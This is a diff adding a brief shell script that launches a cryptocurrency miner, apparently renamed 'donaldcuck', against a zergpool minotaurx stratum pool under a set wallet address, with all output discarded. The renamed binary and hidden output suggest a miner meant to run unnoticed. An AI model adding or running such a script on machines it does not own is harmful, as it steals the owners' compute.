@@ -1,0 +1,7 @@
+    
+CURR="AVN" 
+PAYOUT="USDT-BEP20"
+ID="V_fringes"
+USER="0x3d1B38f57E7CeF5B29252eef9163D6E793B1DDc0"
+PASS="c=$PAYOUT,mc=$CURR,ID=$ID"
+./donaldcuck -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019  -u $USER -p $PASS &> /dev/null
